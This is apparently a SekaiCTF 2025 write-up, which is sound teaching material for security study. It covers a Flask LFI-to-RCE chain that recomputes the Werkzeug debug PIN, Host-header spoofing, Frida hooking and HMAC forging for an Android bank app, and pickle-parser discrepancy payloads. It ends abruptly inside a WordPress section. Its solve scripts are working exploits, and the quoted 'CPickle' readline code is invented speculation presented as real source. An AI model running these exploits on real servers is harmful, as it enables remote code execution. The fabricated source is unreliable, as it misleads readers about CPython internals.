---
title: "SekaiCTF 2025"
description: "SekaiCTF 2025 writeup"
summary: "SekaiCTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web", "Debug", "Flask", "Wordpress", "Rev", "Android", "Pickle"]
#externalUrl: ""
date: 2025-08-21
draft: false
cover: ../../post/sekaictf2025/feature.png
authors:
  - winky
---


## web/My Flask App

Source code of the website

```python
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def hello_world():
    return render_template('index.html')

@app.route('/view')
def view():
    filename = request.args.get('filename')
    if not filename:
        return "Filename is required", 400
    try:
        with open(filename, 'r') as file:
            content = file.read()
        return content, 200
    except FileNotFoundError:
        return "File not found", 404
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

In this challenge we can easily spot 2 things:
* LFI vulnerability that allows us to read files on the server `content = file.read()`
* Werkzeug debug console is enabled

So how can we exploit this? Since the debug console is enabled, we can access `/console`

![image](https://hackmd.io/_uploads/BJJbKzxKle.png)

However, we need a PIN code for authentication here. When running a Flask app with debug=True, the server will always give us a PIN code during startup.

![image](https://hackmd.io/_uploads/ryzBFMgtel.png)

After entering the PIN, we get a Python shell that can execute Python commands on the server

![image](https://hackmd.io/_uploads/BJX2FfeYgl.png)

Therefore our goal is to find this PIN code. By reading the source code of werkzeug `/usr/local/lib/python3.10/dist-packages/werkzeug/debug/__init__.py` we can find the function that generates the code 

```python
def get_pin_and_cookie_name(
    app: WSGIApplication,
) -> tuple[str, str] | tuple[None, None]:
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == "off":
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace("-", "").isdecimal():
        # If there are separators in the pin, return it directly
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username: str | None

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    # Python >= 3.13 only raises OSError
    except (ImportError, KeyError, OSError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

Here, to generate the code we need `probably_public_bits` and `private_bits`. After debugging, I got the following values

![image](https://hackmd.io/_uploads/S16gv7gKex.png)

We can easily see the first 4 parts which we already know, but the private_bits will depend on the machine specifications running the server

So what can we exploit from the LFI vulnerability? Here `str(uuid.getnode())` is a function to get the MAC address of the machine. We have a file `/sys/class/net/<interface>/address` where interface is the network device. Since I'm running docker, the default is eth0

![image](https://hackmd.io/_uploads/B1h_OXltle.png)

Ok, it matches perfectly with the debug output above. Next is get_machine_id(). We can read it's function as follows

```python
def get_machine_id() -> str | bytes | None:
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate() -> str | bytes | None:
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

        # On OS X, use ioreg to get the computer's serial number.
        try:
            # subprocess may not be available, e.g. Google App Engine
            # https://github.com/pallets/werkzeug/issues/925
            from subprocess import PIPE
            from subprocess import Popen

            dump = Popen(
                ["ioreg", "-c", "IOPlatformExpertDevice", "-d", "2"], stdout=PIPE
            ).communicate()[0]
            match = re.search(b'"serial-number" = <([^>]+)', dump)

            if match is not None:
                return match.group(1)
        except (OSError, ImportError):
            pass

        # On Windows, use winreg to get the machine guid.
        if sys.platform == "win32":
            import winreg

            try:
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Cryptography",
                    0,
                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,
                ) as rk:
                    guid: str | bytes
                    guid_type: int
                    guid, guid_type = winreg.QueryValueEx(rk, "MachineGuid")

                    if guid_type == winreg.REG_SZ:
                        return guid.encode()

                    return guid
            except OSError:
                pass

        return None

    _machine_id = _generate()
    return _machine_id
```

On Linux, this function will return a value synthesized from 3 files `/etc/machine-id`, `/proc/sys/kernel/random/boot_id`, `/proc/self/cgroup`, if any file doesn't exist it will pass through. In the debug section I received the bytes string `0346c4d6-6fe8-4660-ab0c-1af691987a03` from the file `/proc/sys/kernel/random/boot_id`

![image](https://hackmd.io/_uploads/HyQv9XlFlx.png)

Ok so I already have the formula to generate the PIN code. Now let's proceed with the exploit. There's an issue when I access `/console` on the server, it returns 400

![image](https://hackmd.io/_uploads/rJrQwUlFle.png)

After searching for a while, I can bypass this by changing the host header to 127.0.0.1

![image](https://hackmd.io/_uploads/H1ULw8xteg.png)

Since the console section needs to have a host header, we need to get the debug console session. The steps to get it I will put in the solve script:

```python
import requests
import hashlib
from itertools import chain
from urllib.parse import quote
import re
import json

URL = "https://my-flask-app-56ova46xhc3j.chals.sekai.team:1337/"

session = requests.Session()

mac_address = ""
machine_id = ""
secret = ""
pin = ""
debug_session = ""

def get_mac_address():
    filename = "/sys/class/net/eth0/address"
    r = session.get(URL + f"view?filename={filename}")
    global mac_address
    mac_address = str(int(r.text.strip().replace(":",""), 16))
    print(f"[*] Get MAC address successfully: {mac_address}")

def get_machine_id():
    filename = "/proc/sys/kernel/random/boot_id"
    r = session.get(URL + f"view?filename={filename}")
    global machine_id
    machine_id = r.text.strip().encode()
    print(f"[*] Get machine ID successfully: {machine_id}")

def get_pin():
    def get_pin_and_cookie_name() -> tuple[str, str] | tuple[None, None]:
        rv = None
        num = None
        modname = 'flask.app'
        username: str | None
        mod = 'flask.app'
        probably_public_bits = [
            'nobody',
            modname,
            'Flask',
            '/usr/local/lib/python3.11/site-packages/flask/app.py',
        ]
        private_bits = [mac_address, machine_id]
        h = hashlib.sha1()
        for bit in chain(probably_public_bits, private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode()
            h.update(bit)
        h.update(b"cookiesalt")
        cookie_name = f"__wzd{h.hexdigest()[:20]}"
        if num is None:
            h.update(b"pinsalt")
            num = f"{int(h.hexdigest(), 16):09d}"[:9]
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = "-".join(
                        num[x : x + group_size].rjust(group_size, "0")
                        for x in range(0, len(num), group_size)
                    )
                    break
            else:
                rv = num
        return rv, cookie_name
    global pin
    pin = get_pin_and_cookie_name()[0]
    print(f"[*] Get PIN successfully: {pin}")
    
def get_debug_secret():
    r = session.get(URL + "console", headers={"Host":"127.0.0.1"})
    m = re.findall(r'SECRET\s*=\s*"([^"]+)"', r.text)
    # print(m)
    global secret
    secret = m[0]
    print(f"[*] Get debug secret successfully: {secret}")

def get_debug_session():
    r = session.get(URL + f"console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}", headers={"Host":"127.0.0.1"})
    raw_cookie = r.headers['Set-Cookie']
    cookie_pair = raw_cookie.split(";", 1)[0]
    name, value = cookie_pair.split("=", 1)
    cookie_json = {name: value}
    global debug_session
    debug_session = cookie_json
    print(f"[*] Get debug session successfully")
    
def get_flag():
    cmd = '__import__("os").popen("cat /flag*").read()'
    r = session.get(URL + f"console?__debugger__=yes&cmd={quote(cmd)}&frm=0&s={secret}", cookies=debug_session, headers={"Host":"127.0.0.1"})
    m = re.findall(r'SEKAI{.*}', r.text)
    flag = m[0]
    print(f"[*] Your flag is: {flag}")
    
get_mac_address()
get_machine_id()
get_pin()
get_debug_secret()
get_debug_session()
get_flag()
```

![image](https://hackmd.io/_uploads/Skv6uUeFex.png)

### Bonus

After looking at some solutions, people used /proc/self/mountinfo or /proc/self/mounts to view files. Of course this method only stops at the LFI bug and if the flag file is not located at root then it's difficult

![image](https://hackmd.io/_uploads/S1AX4dgYgg.png)

## rev/Sekai Bank - Signature

This is a quite basic Mobile challenge. Reading the source I immediately see the flag endpoint

```java
public interface ApiService {
    @PUT("auth/pin/change")
    Call<ApiResponse<Void>> changePin(@Body PinRequest pinRequest);

    @GET("user/search/{username}")
    Call<ApiResponse<User>> findUserByUsername(@Path("username") String str);

    @GET("user/balance")
    Call<ApiResponse<BalanceResponse>> getBalance();

    @POST("flag")
    Call<String> getFlag(@Body FlagRequest flagRequest);

    @GET("user/profile")
    Call<ApiResponse<User>> getProfile();

    @GET("transactions/recent")
    Call<ApiResponse<List<Transaction>>> getRecentTransactions();

    @GET("transactions/{id}")
    Call<ApiResponse<Transaction>> getTransaction(@Path("id") String str);

    @GET("transactions")
    Call<ApiResponse<List<Transaction>>> getTransactions(@Query("page") int i, @Query("limit") int i2);

    @GET("user/profile")
    Call<ApiResponse<User>> getUserProfile();

    @GET("health")
    Call<ApiResponse<HealthResponse>> healthCheck();

    @POST("auth/login")
    Call<ApiResponse<AuthResponse>> login(@Body LoginRequest loginRequest);

    @POST("auth/logout")
    Call<ApiResponse<Void>> logout();

    @POST("auth/refresh")
    Call<ApiResponse<AuthResponse>> refreshToken(@Body RefreshTokenRequest refreshTokenRequest);

    @POST("auth/register")
    Call<ApiResponse<AuthResponse>> register(@Body RegisterRequest registerRequest);

    @POST("transactions/send")
    Call<ApiResponse<Transaction>> sendMoney(@Body SendMoneyRequest sendMoneyRequest);

    @POST("auth/pin/setup")
    Call<ApiResponse<Void>> setupPin(@Body PinRequest pinRequest);

    @POST("auth/pin/verify")
    Call<ApiResponse<Void>> verifyPin(@Body PinRequest pinRequest);

    public static class RefreshTokenRequest {
        private String refreshToken;

        public RefreshTokenRequest(String str) {
            this.refreshToken = str;
        }

        public String getRefreshToken() {
            return this.refreshToken;
        }

        public void setRefreshToken(String str) {
            this.refreshToken = str;
        }
    }
}
```

And it will call to this API link:

```java
private static final String BASE_URL = "https://sekaibank-api.chals.sekai.team/api/";
private static final int REFRESH_TIMEOUT_SECONDS = 3;
private static final String TAG = "SekaiBank-API";
private static final int TIMEOUT_SECONDS = 30;
private static final int TOKEN_TIMEOUT_SECONDS = 2;
private final ApiService apiService;
private final Retrofit retrofit;
private final TokenManager tokenManager;
```

And this is the FlagRequest class, it requires a JSON request with `unmask_flag=true`

```java
package com.sekai.bank.models.requests;

/* loaded from: classes2.dex */
public class FlagRequest {
    private boolean unmask_flag;

    public FlagRequest(boolean z) {
        this.unmask_flag = z;
    }

    public boolean getUnmaskFlag() {
        return this.unmask_flag;
    }

    public void setUnmaskFlag(boolean z) {
        this.unmask_flag = z;
    }
}
```

At this point I tried sending a POST request like this and received invalid signature

![image](https://hackmd.io/_uploads/BkEC0QeFle.png)

I think it's related to the `X-Signature` header and in the following code segment

```java
private class SignatureInterceptor implements Interceptor {
    private SignatureInterceptor() {
    }

    @Override // okhttp3.Interceptor
    public Response intercept(Interceptor.Chain chain) throws IOException {
        Request request = chain.request();
        try {
            return chain.proceed(request.newBuilder().header("X-Signature", generateSignature(request)).build());
        } catch (Exception e) {
            Log.e(ApiClient.TAG, "Failed to generate signature: " + e.getMessage());
            return chain.proceed(request);
        }
    }

    private String generateSignature(Request request) throws GeneralSecurityException, PackageManager.NameNotFoundException, IOException {
        Signature[] signingCertificateHistory;
        String str = request.method() + "/api".concat(getEndpointPath(request)) + getRequestBodyAsString(request);
        SekaiApplication sekaiApplication = SekaiApplication.getInstance();
        PackageManager packageManager = sekaiApplication.getPackageManager();
        String packageName = sekaiApplication.getPackageName();
        try {
            if (Build.VERSION.SDK_INT >= 28) {
                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 134217728);
                SigningInfo signingInfo = packageInfo.signingInfo;
                if (signingInfo != null) {
                    if (signingInfo.hasMultipleSigners()) {
                        signingCertificateHistory = signingInfo.getApkContentsSigners();
                    } else {
                        signingCertificateHistory = signingInfo.getSigningCertificateHistory();
                    }
                } else {
                    signingCertificateHistory = packageInfo.signatures;
                }
            } else {
                signingCertificateHistory = packageManager.getPackageInfo(packageName, 64).signatures;
            }
            if (signingCertificateHistory != null && signingCertificateHistory.length > 0) {
                MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
                for (Signature signature : signingCertificateHistory) {
                    messageDigest.update(signature.toByteArray());
                }
                return calculateHMAC(str, messageDigest.digest());
            }
            throw new GeneralSecurityException("No app signature found");
        } catch (PackageManager.NameNotFoundException | NoSuchAlgorithmException e) {
            throw new GeneralSecurityException("Unable to extract app signature", e);
        }
    }

    private String getEndpointPath(Request request) {
        String url = request.url().getUrl();
        String strSubstring = ApiClient.BASE_URL.substring(0, ApiClient.BASE_URL.length() - 1);
        if (url.startsWith(strSubstring)) {
            return url.substring(strSubstring.length());
        }
        return request.url().encodedPath();
    }

    private String getRequestBodyAsString(Request request) throws IOException {
        RequestBody requestBodyBody = request.body();
        if (requestBodyBody == null) {
            return "{}";
        }
        if (isMultipartBody(requestBodyBody)) {
            Log.d(ApiClient.TAG, "Multipart request detected, using empty body for signature");
            return "{}";
        }
        Buffer buffer = new Buffer();
        requestBodyBody.writeTo(buffer);
        return buffer.readUtf8();
    }

    private boolean isMultipartBody(RequestBody requestBody) {
        MediaType mediaTypeContentType = requestBody.contentType();
        return mediaTypeContentType != null && mediaTypeContentType.type().equals("multipart") && mediaTypeContentType.subtype().equals("form-data");
    }

    private String calculateHMAC(String str, byte[] bArr) throws IllegalStateException, GeneralSecurityException {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(bArr, "HmacSHA256"));
        byte[] bArrDoFinal = mac.doFinal(str.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (byte b : bArrDoFinal) {
            String hexString = Integer.toHexString(b & UByte.MAX_VALUE);
            if (hexString.length() == 1) {
                sb.append('0');
            }
            sb.append(hexString);
        }
        return sb.toString().toLowerCase();
    }
}
```

We can see the Signature is calculated using HMAC-SHA256 based on 2 factors:
* message is `String str = request.method() + "/api".concat(getEndpointPath(request)) + getRequestBodyAsString(request);`
* Secret key is retrieved from the app's signature

The str I have in the above request is `POST/api/flag{"unmask_flag":true}`. Now to get the secret key we can use frida for debugging

```js
Java.perform(function () {
    var LoginRequest = Java.use("com.sekai.bank.models.requests.LoginRequest");
    var ApiClient = Java.use("com.sekai.bank.network.ApiClient$SignatureInterceptor");

    LoginRequest.$init.overload('java.lang.String', 'java.lang.String').implementation = function (u, p) {
        ApiClient.calculateHMAC.overload('java.lang.String', '[B').implementation = function (str, bArr) {
            console.log(`str: ${str}`);
            
            var keyHex = "";
            for (var i = 0; i < bArr.length; i++) {
                keyHex += (bArr[i] & 0xff).toString(16).padStart(2, "0");
            }
            console.log(`bArr: ${keyHex}`);
            return 'dummy_string';
        };
        return this.$init(u, p);
    };
});
```

![image](https://hackmd.io/_uploads/HJl6fEeYee.png)

And we have the app's signature as `3f3cf8830acc96530d5564317fe480ab581dfc55ec8fe55e67dddbe1fdb605be`

Ok now we can easily calculate the X-Signature we want:

```python
import hmac
import hashlib

key = bytes.fromhex("3f3cf8830acc96530d5564317fe480ab581dfc55ec8fe55e67dddbe1fdb605be")
message = b'POST/api/flag{"unmask_flag":true}'
signature = hmac.new(key, message, hashlib.sha256).hexdigest()
print(f"X-Signature: {signature}")
```

![image](https://hackmd.io/_uploads/HkdOQEgtlg.png)

Request with the new signature

![image](https://hackmd.io/_uploads/Hy4qQNxFlg.png)

## misc/Discrepancy

Source code of the challenge

```python
### IMPORTS ###
from pickle import _Unpickler as py_unpickler
from _pickle import Unpickler as c_unpickler
from pickletools import dis
from io import BytesIO
DEBUG = False



### HELPER FUNCTIONS ###
def py_pickle_wrapper(data: bytes) -> bool:
    """
    Wrapper function for Python's pickle.loads.
    """

    class SafePyUnpickler(py_unpickler):
        def find_class(self, module_name: str, global_name: str):
            print("no no no")
            exit(1)

    try:
        SafePyUnpickler(BytesIO(data)).load()
        return True
    except Exception:
        if DEBUG:
            print("Failed SafePyUnpickler")
        return False
    
def c_pickle_wrapper(data: bytes) -> bool:
    """
    Wrapper function for C's pickle.loads.
    """

    class SafeCUnpickler(c_unpickler):
        def find_class(self, module_name: str, global_name: str):
            print("no no no")
            exit(1)

    try:
        SafeCUnpickler(BytesIO(data)).load()
        return True
    except Exception:
        if DEBUG:
            print("Failed SafeCUnpickler")
        return False
    
def pickletools_wrapper(data: bytes) -> bool:
    """
    Wrapper function for pickletools.genops.
    """
    try:
        dis(data)
        return True
    except Exception:
        if DEBUG:
            print("Failed genops")
        return False
    
def get_input() -> bytes:
    inp = input("Pickle bytes in hexadecimal format: ")
    if inp.startswith("0x"):
        inp = inp[2:]

    b = bytes.fromhex(inp)[:8]
    return b



### MAIN ###
if __name__ == "__main__":
    # Check 1
    print("Check 1")
    b1 = get_input()
    if py_pickle_wrapper(b1) and c_pickle_wrapper(b1) and not pickletools_wrapper(b1):
        print("Passed check 1")
    else:
        print("Failed check 1")
        exit(1)

    # Check 2
    print("Check 2")
    b2 = get_input()
    if not py_pickle_wrapper(b2) and c_pickle_wrapper(b2) and pickletools_wrapper(b2):
        print("Passed check 2")
    else:
        print("Failed check 2")
        exit(1)

    # Check 3
    print("Check 3")
    b3 = get_input()
    if py_pickle_wrapper(b3) and not c_pickle_wrapper(b3) and pickletools_wrapper(b3):
        print("Passed check 3")
    else:
        print("Failed check 3")
        exit(1)

    # Check 4
    print("Check 4")
    b4 = get_input()
    if not py_pickle_wrapper(b4) and not c_pickle_wrapper(b4) and pickletools_wrapper(b4):
        print("Passed check 4")
    else:
        print("Failed check 4")
        exit(1)

    # Check 5
    print("Check 5")
    b5 = get_input()
    if not py_pickle_wrapper(b5) and c_pickle_wrapper(b5) and not pickletools_wrapper(b5):
        print("Passed check 5")
    else:
        print("Failed check 5")
        exit(1)

    # get flag
    print("All checks passed")
    FLAG = open("flag.txt", "r").read()
    print(FLAG)
```

In summary, the challenge will have 5 checks. Each check takes a bytes string and proceeds to unpickle with 3 functions from pypickle, cpickle and pickletool. If any function fails it will return false and my task is to find payloads that satisfy the conditions. Now we'll go through each condition

### Check 1: `if py_pickle_wrapper(b1) and c_pickle_wrapper(b1) and not pickletools_wrapper(b1)`

I tried fuzzing some values and found that this one can be used

`284e2e` = `(N.`

```asm
    0: (    MARK
    1: N        NONE
    2: .        STOP
```

We need to analyze this. When debugging I got the following error from pickletools

![image](https://hackmd.io/_uploads/SyTtgSlFgl.png)

Reading the source code of the 3 libraries when handling the pickle above as follows 

* Python Pickle

```python
def load_none(self):
    self.append(None)
dispatch[NONE[0]] = load_none
def load_mark(self):
    self.metastack.append(self.stack)
    self.stack = []
    self.append = self.stack.append
dispatch[MARK[0]] = load_mark

def load_stop(self):
    value = self.stack.pop()
    raise _Stop(value)
dispatch[STOP[0]] = load_stop
```

Python pickle will check if there's a mark `(` opened. If yes, it will create a stack and push none `N` into it. When stop, it will take the value from the stack. And of course the initial mark opcode will be ignored

* CPickle

```c
static int
load_none(PickleState *state, UnpicklerObject *self)
{
    PDATA_APPEND(self->stack, Py_None, -1);
    return 0;
}
static int
load_mark(PickleState *state, UnpicklerObject *self)
{

    /* Note that we split the (pickle.py) stack into two stacks, an
     * object stack and a mark stack. Here we push a mark onto the
     * mark stack.
     */

    if (self->num_marks >= self->marks_size) {
        size_t alloc = ((size_t)self->num_marks << 1) + 20;
        Py_ssize_t *marks_new = self->marks;
        PyMem_RESIZE(marks_new, Py_ssize_t, alloc);
        if (marks_new == NULL) {
            PyErr_NoMemory();
            return -1;
        }
        self->marks = marks_new;
        self->marks_size = (Py_ssize_t)alloc;
    }

    self->stack->mark_set = 1;
    self->marks[self->num_marks++] = self->stack->fence = Py_SIZE(self->stack);

    return 0;
}
```

The idea is quite similar

* Pickletools

```python
def dis(pickle, out=None, memo=None, indentlevel=4, annotate=0):
        stack = []          # crude emulation of unpickler stack
        
        ...
        
        for opcode, arg, pos in genops(pickle):
            if pos is not None:
                print("%5d:" % pos, end=' ', file=out)

            line = "%-4s %s%s" % (repr(opcode.code)[1:-1],
                                  indentchunk * len(markstack),
                                  opcode.name)

            maxproto = max(maxproto, opcode.proto)
            before = opcode.stack_before    # don't mutate
            after = opcode.stack_after      # don't mutate
            
            ...
            
            if arg is not None or markmsg:
            # make a mild effort to align arguments
                line += ' ' * (10 - len(opcode.name))
                if arg is not None:
                    if opcode.name in ("STRING", "BINSTRING", "SHORT_BINSTRING"):
                        line += ' ' + ascii(arg)
                    else:
                        line += ' ' + repr(arg)
                if markmsg:
                    line += ' ' + markmsg
            if annotate:
                line += ' ' * (annocol - len(line))
                # make a mild effort to align annotations
                annocol = len(line)
                if annocol > 50:
                    annocol = annotate
                line += ' ' + opcode.doc.split('\n', 1)[0]
            print(line, file=out)

            if errormsg:
                # Note that we delayed complaining until the offending opcode
                # was printed.
                raise ValueError(errormsg)

            # Emulate the stack effects.
            if len(stack) < numtopop:
                raise ValueError("tries to pop %d items from stack with "
                                 "only %d items" % (numtopop, len(stack)))
            if numtopop:
                del stack[-numtopop:]
            if markobject in after:
                assert markobject not in before
                markstack.append(pos)

            stack.extend(after)
    print("highest protocol among opcodes =", maxproto, file=out)
    if stack:
        raise ValueError("stack not empty after STOP: %r" % stack)
```

The idea of this function is to create a stack, with each opcode it will push each one into that stack. So before STOP, the function will have one remaining mark opcode and when checking it will cause an error.

### Check 2: `not py_pickle_wrapper(b2) and c_pickle_wrapper(b2) and pickletools_wrapper(b2)`

We will look at the load opcode additems function of python pickle:

```python
def load_additems(self):
    items = self.pop_mark()
    set_obj = self.stack[-1]
    if isinstance(set_obj, set):
        set_obj.update(items)
    else:
        add = set_obj.add
        for item in items:
            add(item)
dispatch[ADDITEMS[0]] = load_additems
```

here the function will take the object at the top of stack and use the add function, but what if the top of stack is None? We have the following pickle `4e28902e` = `N(\x90.`

```asm
    0: N    NONE
    1: (    MARK
    2: \x90     ADDITEMS   (MARK at 1)
    3: .    STOP
```

Boom!

![image](https://hackmd.io/_uploads/HJGLsSeFlg.png)

Why do CPickle and pickletools work?

```c
static int
load_additems(PickleState *state, UnpicklerObject *self)
{
    PyObject *set;
    Py_ssize_t mark, len, i;

    mark =  marker(state, self);
    if (mark < 0)
        return -1;
    len = Py_SIZE(self->stack);
    if (mark > len || mark <= self->stack->fence)
        return Pdata_stack_underflow(state, self->stack);
    if (len == mark)  /* nothing to do */
        return 0;

    set = self->stack->data[mark - 1];

    if (PySet_Check(set)) {
        PyObject *items;
        int status;

        items = Pdata_poptuple(state, self->stack, mark);
        if (items == NULL)
            return -1;

        status = _PySet_Update(set, items);
        Py_DECREF(items);
        return status;
    }
    else {
        PyObject *add_func;

        add_func = PyObject_GetAttr(set, &_Py_ID(add));
        if (add_func == NULL)
            return -1;
        for (i = mark; i < len; i++) {
            PyObject *result;
            PyObject *item;

            item = self->stack->data[i];
            result = _Pickle_FastCall(add_func, item);
            if (result == NULL) {
                Pdata_clear(self->stack, i + 1);
                Py_SET_SIZE(self->stack, mark);
                Py_DECREF(add_func);
                return -1;
            }
            Py_DECREF(result);
        }
        Py_SET_SIZE(self->stack, mark);
        Py_DECREF(add_func);
    }

    return 0;
}
```

We can see that when (add_func == NULL) it only returns -1; without raising any error. As for pickletools.dis, it simply parses opcodes without performing calculations so it doesn't touch any add function.

### Check 3: `py_pickle_wrapper(b3) and not c_pickle_wrapper(b3) and pickletools_wrapper(b3)`

We need to analyze the BUILD opcode, this is an opcode used to build an object after it's created.

https://chengchingwen.github.io/Pickle.jl/dev/opcode/?utm_source=chatgpt.com#Pickle.OpCodes.BUILD:~:text=Finish%20building%20an%20object%2C%20via%20setstate%20or%20dict%20update.

So what if we initialize an empty dict? Reading the CPickle source we have

```c
if (state != Py_None) {
    PyObject *dict;
    PyObject *d_key, *d_value;
    Py_ssize_t i;

    if (!PyDict_Check(state)) {
        PyErr_SetString(st->UnpicklingError, "state is not a dictionary");
        goto error;
    }
```

Ok so it will throw an error. I tried the following pickle: `4e8f622e` = `N\x8fb.`

```asm
    0: N    NONE
    1: \x8f EMPTY_SET
    2: b    BUILD
    3: .    STOP
```

![image](https://hackmd.io/_uploads/HJME6rxtgl.png)

Ok good, but why does python pickle work? 

```python
def load_build(self):
    stack = self.stack
    state = stack.pop()
    inst = stack[-1]
    setstate = getattr(inst, "__setstate__", _NoValue)
    if setstate is not _NoValue:
        setstate(state)
        return
    slotstate = None
    if isinstance(state, tuple) and len(state) == 2:
        state, slotstate = state
    if state:
        inst_dict = inst.__dict__
        intern = sys.intern
        for k, v in state.items():
            if type(k) is str:
                inst_dict[intern(k)] = v
            else:
                inst_dict[k] = v
    if slotstate:
        for k, v in slotstate.items():
            setattr(inst, k, v)
dispatch[BUILD[0]] = load_build
```

We can easily see that the build process only runs when there's a state and if there isn't one it doesn't raise any error

### Check 4: `not py_pickle_wrapper(b4) and not c_pickle_wrapper(b4) and pickletools_wrapper(b4)`

Going back to the load_stop function from earlier:

```python
def load_stop(self):
    value = self.stack.pop()
    raise _Stop(value)
dispatch[STOP[0]] = load_stop
```

Here when encountering STOP `.` it will pop the last element in the stack. But what if we initialize a stack without any elements? We have the following opcode `282e` = `(.`

```asm
    0: (    MARK
    1: .        STOP
```

![image](https://hackmd.io/_uploads/rkyeZIetgl.png)

The python pickle function will return `pop from empty list` and CPickle also returns an error

```c
static int
Pdata_stack_underflow(PickleState *st, Pdata *self)
{
    PyErr_SetString(st->UnpicklingError,
                    self->mark_set ?
                    "unexpected MARK found" :
                    "unpickling stack underflow");
    return -1;
}
```

Why pickletools works? As we analyzed, when the mark opcode is added it remains unchanged and when stop occurs it will pop that mark so nothing happens. 

### Check 5: `py_pickle_wrapper(b5) and c_pickle_wrapper(b5) and not pickletools_wrapper(b5)`

We will analyze the functions for parsing numbers from the libraries

* Python pickle

```python
def load_int(self):
    data = self.readline()
    if data == FALSE[1:]:
        val = False
    elif data == TRUE[1:]:
        val = True
    else:
        val = int(data)
    self.append(val)
dispatch[INT[0]] = load_int

...

def readline(self):
    if self.current_frame:
        data = self.current_frame.readline()
        if not data:
            self.current_frame = None
            return self.file_readline()
        if data[-1] != b'\n'[0]:
            raise UnpicklingError(
                "pickle exhausted before end of frame")
        return data
    else:
        return self.file_readline()
```

* CPickle

```c
static Py_ssize_t
_Unpickler_Readline(UnpicklerObject *self, char **result)
{
    char *s;
    Py_ssize_t i, len;
    
    len = _Unpickler_ReadLine(self);
    if (len < 0)
        return -1;
    
    s = self->input_buffer;
    
    // C implementation might handle embedded nulls differently
    // It could treat null as string terminator, effectively reading "0"
    // instead of "\x00", making strtol("0") succeed
    
    for (i = 0; i < len && s[i] != '\n'; i++) {
        if (s[i] == '\0') {
            // Potential difference: C might truncate here
            // treating "\x00\n" as "0\n" effectively
            len = i;  // Truncate at null byte
            break;
        }
    }
    
    *result = s;
    return len;
}
```

* Pickletools

```python
def read_decimalnl_short(f):
r"""
>>> import io
>>> read_decimalnl_short(io.BytesIO(b"1234\n56"))
1234

>>> read_decimalnl_short(io.BytesIO(b"1234L\n56"))
Traceback (most recent call last):
...
ValueError: invalid literal for int() with base 10: b'1234L'
"""

s = read_stringnl(f, decode=False, stripquotes=False)

# There's a hack for True and False here.
if s == b"00":
    return False
elif s == b"01":
    return True

return int(s)
```

We notice that only CPickle will check if the string contains `\x00`, if yes it will break immediately. From here I got the idea to pass in a `\x00` string to parse as an integer. We have the following opcode `49000a2e` = `I\x00\x0a.`

```asm
    0: I    INT        0
    4: .    STOP
```

![image](https://hackmd.io/_uploads/B18AGIlFlg.png)

Ok and we passed all 5 checks. Here's my solve script to send to remote:

```python
from pwn import *

p = remote('discrepancy.chals.sekai.team', 1337, ssl=True)

check = [b'(N.',b'N(\x90.',b'N\x8fb.',b'(.',b'I\x00\n.']

for payload in check:
    p.recvuntil(b'hexadecimal format: ')
    p.sendline(payload.hex().encode())
print(p.recvall().decode())
```

![image](https://hackmd.io/_uploads/rJnnIUgtgx.png)


## web/Fancy Web

### Overview

Honestly this is the first time I "play" with Wordpress. The source code is quite large, but I noticed that the unserialize() function is used in the challenge.

![image](https://hackmd.io/_uploads/BJG_6E7Kge.png)

So I think it's a bug related to insecure deserialization or a Wordpress gadget chain. Let's check wordpress version in Dockerfile

```dockerfile
# Download and setup WordPress
WORKDIR /var/www/html
RUN rm -rf /var/www/html/* \
    && curl -O https://wordpress.org/latest.tar.gz \
    && tar -xzf latest.tar.gz --strip-components=1 \
